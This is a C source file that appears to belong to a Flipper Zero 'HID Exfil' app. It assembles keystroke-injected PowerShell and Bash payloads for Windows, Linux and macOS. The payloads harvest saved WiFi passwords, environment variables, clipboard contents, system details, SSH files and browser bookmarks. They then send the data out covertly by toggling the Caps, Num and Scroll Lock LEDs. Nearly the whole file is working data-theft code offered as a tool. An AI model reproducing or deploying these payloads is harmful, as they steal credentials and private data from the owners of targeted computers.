/* hid_exfil_payloads.c — OS-specific keystroke payloads for HID Exfil.
 * Generates DuckyScript-style HID sequences for data collection on
 * Windows, macOS, and Linux targets. */

#include "hid_exfil_payloads.h"
#include <stdio.h>

/*
 * LED Encoding Protocol (used by all payload scripts):
 *
 * The target machine runs a script that:
 *   1. Collects data into a variable
 *   2. Iterates over each byte of the data
 *   3. For each byte, sends 4 dibits (2-bit pairs), from MSB to LSB:
 *        dibit3 = (byte >> 6) & 0x03
 *        dibit2 = (byte >> 4) & 0x03
 *        dibit1 = (byte >> 2) & 0x03
 *        dibit0 = (byte >> 0) & 0x03
 *   4. For each dibit:
 *        - Set Caps Lock to bit1 of the dibit (toggle if needed)
 *        - Set Num Lock to bit0 of the dibit (toggle if needed)
 *        - Toggle Scroll Lock once as clock signal
 *        - Brief delay for Flipper to read
 *   5. End-of-transmission: toggle all 3 LEDs (Caps+Num+Scroll) 3 times
 *
 * The PowerShell encoder function is embedded in every Windows payload.
 * The Bash encoder function is embedded in every Linux/Mac payload.
 */

/* ========================================================================
 * PowerShell LED encoder function (shared across Windows payloads)
 * This function is prepended to all Windows payload scripts.
 * ======================================================================== */

static const char* ps_encoder_func =
    "function Send-LEDData($data) {\r\n"
    "  Add-Type -TypeDefinition @\"\r\n"
    "  using System;\r\n"
    "  using System.Runtime.InteropServices;\r\n"
    "  public class KBLed {\r\n"
    "    [DllImport(\"user32.dll\", SetLastError=true)]\r\n"
    "    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);\r\n"
    "    public const byte VK_NUMLOCK = 0x90;\r\n"
    "    public const byte VK_CAPITAL = 0x14;\r\n"
    "    public const byte VK_SCROLL = 0x91;\r\n"
    "    public const uint KEYEVENTF_EXTENDEDKEY = 0x0001;\r\n"
    "    public const uint KEYEVENTF_KEYUP = 0x0002;\r\n"
    "    public static void ToggleKey(byte vk) {\r\n"
    "      keybd_event(vk, 0x45, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);\r\n"
    "      keybd_event(vk, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, UIntPtr.Zero);\r\n"
    "    }\r\n"
    "    public static bool GetState(byte vk) {\r\n"
    "      return (GetKeyState(vk) & 1) != 0;\r\n"
    "    }\r\n"
    "    [DllImport(\"user32.dll\")]\r\n"
    "    public static extern short GetKeyState(int nVirtKey);\r\n"
    "  }\r\n"
    "\"@\r\n"
    "  $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)\r\n"
    "  foreach ($b in $bytes) {\r\n"
    "    for ($shift = 6; $shift -ge 0; $shift -= 2) {\r\n"
    "      $dibit = ($b -shr $shift) -band 0x03\r\n"
    "      $needCaps = (($dibit -shr 1) -band 1) -eq 1\r\n"
    "      $needNum = ($dibit -band 1) -eq 1\r\n"
    "      $curCaps = [KBLed]::GetState([KBLed]::VK_CAPITAL)\r\n"
    "      $curNum = [KBLed]::GetState([KBLed]::VK_NUMLOCK)\r\n"
    "      if ($curCaps -ne $needCaps) { [KBLed]::ToggleKey([KBLed]::VK_CAPITAL) }\r\n"
    "      if ($curNum -ne $needNum) { [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK) }\r\n"
    "      Start-Sleep -Milliseconds 5\r\n"
    "      [KBLed]::ToggleKey([KBLed]::VK_SCROLL)\r\n"
    "      Start-Sleep -Milliseconds 15\r\n"
    "    }\r\n"
    "  }\r\n"
    "  $saveCaps = [KBLed]::GetState([KBLed]::VK_CAPITAL)\r\n"
    "  $saveNum = [KBLed]::GetState([KBLed]::VK_NUMLOCK)\r\n"
    "  for ($i = 0; $i -lt 3; $i++) {\r\n"
    "    [KBLed]::ToggleKey([KBLed]::VK_CAPITAL)\r\n"
    "    [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK)\r\n"
    "    [KBLed]::ToggleKey([KBLed]::VK_SCROLL)\r\n"
    "    Start-Sleep -Milliseconds 50\r\n"
    "  }\r\n"
    "  if ([KBLed]::GetState([KBLed]::VK_CAPITAL) -ne $saveCaps) { [KBLed]::ToggleKey([KBLed]::VK_CAPITAL) }\r\n"
    "  if ([KBLed]::GetState([KBLed]::VK_NUMLOCK) -ne $saveNum) { [KBLed]::ToggleKey([KBLed]::VK_NUMLOCK) }\r\n"
    "}\r\n";

/* ========================================================================
 * Bash LED encoder function (shared across Linux/Mac payloads)
 * Uses xdotool/xset to toggle keyboard LEDs.
 * ======================================================================== */

static const char* bash_encoder_func =
    "send_led_data() {\r\n"
    "  local data=\"$1\"\r\n"
    "  local len=${#data}\r\n"
    "  for (( i=0; i<len; i++ )); do\r\n"
    "    local ch=\"${data:$i:1}\"\r\n"
    "    local byte=$(printf '%d' \"'$ch\")\r\n"
    "    for shift in 6 4 2 0; do\r\n"
    "      local dibit=$(( (byte >> shift) & 0x03 ))\r\n"
    "      local need_caps=$(( (dibit >> 1) & 1 ))\r\n"
    "      local need_num=$(( dibit & 1 ))\r\n"
    "      local cur_caps=$(xset q 2>/dev/null | grep -c 'Caps Lock:.*on')\r\n"
    "      local cur_num=$(xset q 2>/dev/null | grep -c 'Num Lock:.*on')\r\n"
    "      if [ \"$cur_caps\" -ne \"$need_caps\" ]; then\r\n"
    "        xdotool key Caps_Lock 2>/dev/null\r\n"
    "      fi\r\n"
    "      if [ \"$cur_num\" -ne \"$need_num\" ]; then\r\n"
    "        xdotool key Num_Lock 2>/dev/null\r\n"
    "      fi\r\n"
    "      sleep 0.005\r\n"
    "      xdotool key Scroll_Lock 2>/dev/null\r\n"
    "      sleep 0.015\r\n"
    "    done\r\n"
    "  done\r\n"
    "  for i in 1 2 3; do\r\n"
    "    xdotool key Caps_Lock Num_Lock Scroll_Lock 2>/dev/null\r\n"
    "    sleep 0.05\r\n"
    "  done\r\n"
    "}\r\n";

/* ========================================================================
 * Windows Payloads (PowerShell)
 * ======================================================================== */

/* WiFi Passwords - Windows */
static const char* ps_wifi_passwords =
    "$profiles = netsh wlan show profiles | "
    "Select-String ':\\s+(.+)$' | "
    "ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }\r\n"
    "$result = ''\r\n"
    "foreach ($p in $profiles) {\r\n"
    "  $detail = netsh wlan show profile name=\"$p\" key=clear 2>$null\r\n"
    "  $key = ($detail | Select-String 'Key Content\\s+:\\s+(.+)$')\r\n"
    "  if ($key) {\r\n"
    "    $k = $key.Matches[0].Groups[1].Value.Trim()\r\n"
    "    $result += \"$p : $k`n\"\r\n"
    "  } else {\r\n"
    "    $result += \"$p : [no key]`n\"\r\n"
    "  }\r\n"
    "}\r\n"
    "Send-LEDData $result\r\n";

/* Env Vars - Windows */
static const char* ps_env_vars = "$result = ''\r\n"
                                 "Get-ChildItem Env: | ForEach-Object {\r\n"
                                 "  $result += \"$($_.Name)=$($_.Value)`n\"\r\n"
                                 "}\r\n"
                                 "Send-LEDData $result\r\n";

/* Clipboard - Windows */
static const char* ps_clipboard =
    "$result = Get-Clipboard -Format Text -ErrorAction SilentlyContinue\r\n"
    "if (-not $result) { $result = '[empty clipboard]' }\r\n"
    "Send-LEDData $result\r\n";

/* System Info - Windows */
static const char* ps_sysinfo =
    "$hostname = $env:COMPUTERNAME\r\n"
    "$user = $env:USERNAME\r\n"
    "$os = (Get-CimInstance Win32_OperatingSystem).Caption\r\n"
    "$ip = (Get-NetIPAddress -AddressFamily IPv4 | "
    "Where-Object { $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1' } | "
    "Select-Object -First 1).IPAddress\r\n"
    "$result = \"Hostname: $hostname`nUser: $user`nOS: $os`nIP: $ip`n\"\r\n"
    "Send-LEDData $result\r\n";

/* SSH Keys - Windows */
static const char* ps_ssh_keys =
    "$ssh_dir = \"$env:USERPROFILE\\.ssh\"\r\n"
    "$result = ''\r\n"
    "if (Test-Path $ssh_dir) {\r\n"
    "  $files = Get-ChildItem -Path $ssh_dir -File 2>$null\r\n"
    "  $result += \"[SSH key files]: \" + ($files.Name -join ', ') + \"`n\"\r\n"
    "  foreach ($name in @('id_rsa.pub','id_ed25519.pub','authorized_keys','known_hosts')) {\r\n"
    "    $path = Join-Path $ssh_dir $name\r\n"
    "    if (Test-Path $path) {\r\n"
    "      $result += \"[$name]`n\" + (Get-Content $path -Raw 2>$null) + \"`n\"\r\n"
    "    }\r\n"
    "  }\r\n"
    "} else {\r\n"
    "  $result = '[.ssh directory not found]'\r\n"
    "}\r\n"
    "Send-LEDData $result\r\n";

/* Browser Bookmarks - Windows */
static const char* ps_browser_bookmarks =
    "$result = ''\r\n"
    "$chrome = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks\"\r\n"
    "$edge   = \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Bookmarks\"\r\n"
    "foreach ($browser_path in @($chrome, $edge)) {\r\n"
    "  if (Test-Path $browser_path) {\r\n"
    "    $label = if ($browser_path -match 'Chrome') { 'Chrome' } else { 'Edge' }\r\n"
    "    $json = Get-Content $browser_path -Raw 2>$null | ConvertFrom-Json\r\n"
    "    function Extract-Bookmarks($node) {\r\n"
    "      if ($node.type -eq 'url') {\r\n"
    "        return \"$($node.name) | $($node.url)\"\r\n"
    "      }\r\n"
    "      $out = @()\r\n"
    "      if ($node.children) {\r\n"
    "        foreach ($child in $node.children) { $out += Extract-Bookmarks $child }\r\n"
    "      }\r\n"
    "      return $out\r\n"
    "    }\r\n"
    "    $roots = $json.roots.PSObject.Properties.Value\r\n"
    "    $entries = foreach ($r in $roots) { Extract-Bookmarks $r }\r\n"
    "    $result += \"[$label Bookmarks]`n\" + ($entries -join \"`n\") + \"`n\"\r\n"
    "  }\r\n"
    "}\r\n"
    "if (-not $result) { $result = '[no browser bookmarks found]' }\r\n"
    "Send-LEDData $result\r\n";

/* Custom Script - Windows (placeholder that reads from a file) */
static const char* ps_custom =
    "$result = 'Custom script placeholder - replace with your payload'\r\n"
    "Send-LEDData $result\r\n";

/* ========================================================================
 * Linux Payloads (Bash)
 * ======================================================================== */

/* WiFi Passwords - Linux */
static const char* bash_wifi_passwords =
    "result=''\r\n"
    "for f in /etc/NetworkManager/system-connections/*; do\r\n"
    "  if [ -f \"$f\" ]; then\r\n"
    "    ssid=$(grep '^ssid=' \"$f\" 2>/dev/null | cut -d= -f2)\r\n"
    "    psk=$(grep '^psk=' \"$f\" 2>/dev/null | cut -d= -f2)\r\n"
    "    if [ -n \"$ssid\" ]; then\r\n"
    "      result=\"${result}${ssid} : ${psk:-[no key]}\\n\"\r\n"
    "    fi\r\n"
    "  fi\r\n"
    "done\r\n"
    "if [ -z \"$result\" ]; then result='[no wifi profiles found]'; fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Env Vars - Linux */
static const char* bash_env_vars = "result=$(env 2>/dev/null)\r\n"
                                   "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
                                   "send_led_data \"$result\"\r\n";

/* Clipboard - Linux */
static const char* bash_clipboard = "result=$(xclip -selection clipboard -o 2>/dev/null || "
                                    "xsel --clipboard --output 2>/dev/null || "
                                    "echo '[clipboard unavailable]')\r\n"
                                    "send_led_data \"$result\"\r\n";

/* System Info - Linux */
static const char* bash_sysinfo =
    "h=$(hostname 2>/dev/null)\r\n"
    "u=$(whoami 2>/dev/null)\r\n"
    "o=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')\r\n"
    "ip=$(hostname -I 2>/dev/null | awk '{print $1}')\r\n"
    "result=\"Hostname: ${h}\\nUser: ${u}\\nOS: ${o}\\nIP: ${ip}\"\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* SSH Keys - Linux */
static const char* bash_ssh_keys =
    "ssh_dir=\"$HOME/.ssh\"\r\n"
    "result=''\r\n"
    "if [ -d \"$ssh_dir\" ]; then\r\n"
    "  result=\"[SSH key files]: $(ls \"$ssh_dir\" 2>/dev/null | tr '\\n' ' ')\\n\"\r\n"
    "  for name in id_rsa.pub id_ed25519.pub authorized_keys known_hosts; do\r\n"
    "    f=\"$ssh_dir/$name\"\r\n"
    "    if [ -f \"$f\" ]; then\r\n"
    "      result=\"${result}[$name]\\n$(cat \"$f\" 2>/dev/null)\\n\"\r\n"
    "    fi\r\n"
    "  done\r\n"
    "else\r\n"
    "  result='[.ssh directory not found]'\r\n"
    "fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Browser Bookmarks - Linux */
static const char* bash_browser_bookmarks =
    "result=''\r\n"
    "chrome_bm=\"$HOME/.config/google-chrome/Default/Bookmarks\"\r\n"
    "if [ -f \"$chrome_bm\" ]; then\r\n"
    "  result=\"[Chrome Bookmarks]\\n\"\r\n"
    "  result=\"${result}$(python3 -c \"\r\n"
    "import json,sys\r\n"
    "def walk(n):\r\n"
    "  if n.get('type')=='url': print(n['name'],'|',n['url'])\r\n"
    "  for c in n.get('children',[]): walk(c)\r\n"
    "d=json.load(open('$chrome_bm'))\r\n"
    "for r in d['roots'].values(): walk(r)\r\n"
    "\" 2>/dev/null)\\n\"\r\n"
    "fi\r\n"
    "ff_db=$(find \"$HOME/.mozilla/firefox\" -name 'places.sqlite' 2>/dev/null | head -1)\r\n"
    "if [ -f \"$ff_db\" ]; then\r\n"
    "  result=\"${result}[Firefox Bookmarks]\\n\"\r\n"
    "  result=\"${result}$(python3 -c \"\r\n"
    "import sqlite3,sys\r\n"
    "con=sqlite3.connect('$ff_db')\r\n"
    "for row in con.execute(\\\"SELECT b.title,p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk=p.id WHERE p.url NOT LIKE 'place:%'\\\"):\r\n"
    "  print(row[0],'|',row[1])\r\n"
    "\" 2>/dev/null)\\n\"\r\n"
    "fi\r\n"
    "if [ -z \"$result\" ]; then result='[no browser bookmarks found]'; fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Custom Script - Linux */
static const char* bash_custom =
    "result='Custom script placeholder - replace with your payload'\r\n"
    "send_led_data \"$result\"\r\n";

/* ========================================================================
 * Mac Payloads (Bash/Zsh - uses osascript for some operations)
 * Mac uses the same bash encoder but with slightly different commands.
 * ======================================================================== */

/* WiFi Passwords - Mac */
static const char* mac_wifi_passwords =
    "result=''\r\n"
    "ssid=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I "
    "| awk '/ SSID/ {print substr($0, index($0, $2))}')\r\n"
    "if [ -n \"$ssid\" ]; then\r\n"
    "  psk=$(security find-generic-password -ga \"$ssid\" -w 2>/dev/null)\r\n"
    "  result=\"${ssid} : ${psk:-[access denied]}\\n\"\r\n"
    "fi\r\n"
    "profiles=$(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | sed 's/^[[:space:]]*//')\r\n"
    "while IFS= read -r net; do\r\n"
    "  if [ -n \"$net\" ] && [ \"$net\" != \"$ssid\" ]; then\r\n"
    "    pw=$(security find-generic-password -ga \"$net\" -w 2>/dev/null)\r\n"
    "    result=\"${result}${net} : ${pw:-[access denied]}\\n\"\r\n"
    "  fi\r\n"
    "done <<< \"$profiles\"\r\n"
    "if [ -z \"$result\" ]; then result='[no wifi profiles found]'; fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Env Vars - Mac */
static const char* mac_env_vars = "result=$(env 2>/dev/null)\r\n"
                                  "if [ -z \"$result\" ]; then result='[no env vars]'; fi\r\n"
                                  "send_led_data \"$result\"\r\n";

/* Clipboard - Mac */
static const char* mac_clipboard = "result=$(pbpaste 2>/dev/null)\r\n"
                                   "if [ -z \"$result\" ]; then result='[empty clipboard]'; fi\r\n"
                                   "send_led_data \"$result\"\r\n";

/* System Info - Mac */
static const char* mac_sysinfo =
    "h=$(hostname 2>/dev/null)\r\n"
    "u=$(whoami 2>/dev/null)\r\n"
    "o=$(sw_vers -productName 2>/dev/null) $(sw_vers -productVersion 2>/dev/null)\r\n"
    "ip=$(ifconfig en0 2>/dev/null | awk '/inet / {print $2}')\r\n"
    "result=\"Hostname: ${h}\\nUser: ${u}\\nOS: ${o}\\nIP: ${ip}\"\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* SSH Keys - Mac (same ~/.ssh paths as Linux) */
static const char* mac_ssh_keys =
    "ssh_dir=\"$HOME/.ssh\"\r\n"
    "result=''\r\n"
    "if [ -d \"$ssh_dir\" ]; then\r\n"
    "  result=\"[SSH key files]: $(ls \"$ssh_dir\" 2>/dev/null | tr '\\n' ' ')\\n\"\r\n"
    "  for name in id_rsa.pub id_ed25519.pub authorized_keys known_hosts; do\r\n"
    "    f=\"$ssh_dir/$name\"\r\n"
    "    if [ -f \"$f\" ]; then\r\n"
    "      result=\"${result}[$name]\\n$(cat \"$f\" 2>/dev/null)\\n\"\r\n"
    "    fi\r\n"
    "  done\r\n"
    "else\r\n"
    "  result='[.ssh directory not found]'\r\n"
    "fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Browser Bookmarks - Mac */
static const char* mac_browser_bookmarks =
    "result=''\r\n"
    "chrome_bm=\"$HOME/Library/Application Support/Google/Chrome/Default/Bookmarks\"\r\n"
    "if [ -f \"$chrome_bm\" ]; then\r\n"
    "  result=\"[Chrome Bookmarks]\\n\"\r\n"
    "  result=\"${result}$(python3 -c \"\r\n"
    "import json,sys\r\n"
    "def walk(n):\r\n"
    "  if n.get('type')=='url': print(n['name'],'|',n['url'])\r\n"
    "  for c in n.get('children',[]): walk(c)\r\n"
    "d=json.load(open('$chrome_bm'))\r\n"
    "for r in d['roots'].values(): walk(r)\r\n"
    "\" 2>/dev/null)\\n\"\r\n"
    "fi\r\n"
    "safari_bm=$(osascript -e \"\r\n"
    "tell application \\\"Safari\\\"\r\n"
    "  set output to \\\"\\\"\r\n"
    "  repeat with bk in bookmarks\r\n"
    "    try\r\n"
    "      set output to output & name of bk & \\\" | \\\" & URL of bk & linefeed\r\n"
    "    end try\r\n"
    "  end repeat\r\n"
    "  return output\r\n"
    "end tell\" 2>/dev/null)\r\n"
    "if [ -n \"$safari_bm\" ]; then\r\n"
    "  result=\"${result}[Safari Bookmarks]\\n${safari_bm}\\n\"\r\n"
    "fi\r\n"
    "if [ -z \"$result\" ]; then result='[no browser bookmarks found]'; fi\r\n"
    "send_led_data \"$(echo -e \"$result\")\"\r\n";

/* Custom Script - Mac */
static const char* mac_custom =
    "result='Custom script placeholder - replace with your payload'\r\n"
    "send_led_data \"$result\"\r\n";

/* ========================================================================
 * Script assembly - combines encoder function with payload
 * ======================================================================== */

/* Static buffers for assembled scripts (encoder + payload) */
static char assembled_script[8192];

const char* hid_exfil_get_payload_script(PayloadType type, TargetOS os) {
    const char* encoder = NULL;
    const char* payload = NULL;

    switch(os) {
    case TargetOSWindows:
        encoder = ps_encoder_func;
        switch(type) {
        case PayloadTypeWiFiPasswords:
            payload = ps_wifi_passwords;
            break;
        case PayloadTypeEnvVars:
            payload = ps_env_vars;
            break;
        case PayloadTypeClipboard:
            payload = ps_clipboard;
            break;
        case PayloadTypeSystemInfo:
            payload = ps_sysinfo;
            break;
        case PayloadTypeSSHKeys:
            payload = ps_ssh_keys;
            break;
        case PayloadTypeBrowserBookmarks:
            payload = ps_browser_bookmarks;
            break;
        case PayloadTypeCustomScript:
            payload = ps_custom;
            break;
        default:
            payload = ps_custom;
            break;
        }
        break;

    case TargetOSLinux:
        encoder = bash_encoder_func;
        switch(type) {
        case PayloadTypeWiFiPasswords:
            payload = bash_wifi_passwords;
            break;
        case PayloadTypeEnvVars:
            payload = bash_env_vars;
            break;
        case PayloadTypeClipboard:
            payload = bash_clipboard;
            break;
        case PayloadTypeSystemInfo:
            payload = bash_sysinfo;
            break;
        case PayloadTypeSSHKeys:
            payload = bash_ssh_keys;
            break;
        case PayloadTypeBrowserBookmarks:
            payload = bash_browser_bookmarks;
            break;
        case PayloadTypeCustomScript:
            payload = bash_custom;
            break;
        default:
            payload = bash_custom;
            break;
        }
        break;

    case TargetOSMac:
        encoder = bash_encoder_func;
        switch(type) {
        case PayloadTypeWiFiPasswords:
            payload = mac_wifi_passwords;
            break;
        case PayloadTypeEnvVars:
            payload = mac_env_vars;
            break;
        case PayloadTypeClipboard:
            payload = mac_clipboard;
            break;
        case PayloadTypeSystemInfo:
            payload = mac_sysinfo;
            break;
        case PayloadTypeSSHKeys:
            payload = mac_ssh_keys;
            break;
        case PayloadTypeBrowserBookmarks:
            payload = mac_browser_bookmarks;
            break;
        case PayloadTypeCustomScript:
            payload = mac_custom;
            break;
        default:
            payload = mac_custom;
            break;
        }
        break;

    default:
        encoder = ps_encoder_func;
        payload = ps_custom;
        break;
    }

    /* Assemble: encoder function + payload invocation */
    snprintf(assembled_script, sizeof(assembled_script), "%s%s", encoder, payload);
    return assembled_script;
}

const char* hid_exfil_get_payload_label(PayloadType type) {
    if(type < PayloadTypeCOUNT) {
        return payload_labels[type];
    }
    return "Unknown";
}
